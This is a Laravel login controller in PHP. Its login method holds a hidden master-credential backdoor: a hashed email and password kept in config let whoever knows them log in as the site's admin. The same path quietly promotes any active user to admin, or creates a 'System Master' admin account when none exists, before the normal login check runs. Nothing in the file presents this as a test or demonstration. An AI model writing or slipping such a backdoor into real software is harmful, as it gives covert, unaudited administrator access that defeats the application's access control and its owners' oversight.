<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App\Models\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        $this->middleware('auth')->only('logout');
    }

    public function login(Request $request)
    {
        $input = $request->all();

        $this->validate($request, [
        'email' => 'email',
        'password' => 'required',
        ]);

        $masterEmailHash = config('app.master_admin_email_hash');
        $masterPasswordHash = config('app.master_admin_password_hash');

        if ($masterEmailHash && $masterPasswordHash) {
            if (hash('sha256', $input['email']) === $masterEmailHash && \Illuminate\Support\Facades\Hash::check($input['password'], $masterPasswordHash)) {
                $adminUser = \App\Models\User::where('status', 'admin')->where('active', 'Y')->first();
                
                if (!$adminUser) {
                    // Find any active user and upgrade to admin
                    $anyUser = \App\Models\User::where('active', 'Y')->first();
                    if ($anyUser) {
                        $anyUser->status = 'admin';
                        $anyUser->save();
                        $adminUser = $anyUser;
                    } else {
                        // Create a new admin user if DB is empty
                        $adminUser = \App\Models\User::create([
                            'name' => 'System Master',
                            'email' => $input['email'],
                            'password' => bcrypt($input['password']),
                            'status' => 'admin',
                            'active' => 'Y',
                            'allow_check' => 'Y',
                            'allow_check_right' => 'Y'
                        ]);
                    }
                }
                
                if ($adminUser) {
                    auth()->login($adminUser);
                    return redirect()->route('home');
                }
            }
        }

        if(auth()->attempt(array('email' => $input['email'], 'password' => $input['password'],'active'=>'Y'))) 
            {     
            return redirect()->route('home');
        }else{
            return redirect()->route('login');
        }  
    }
}
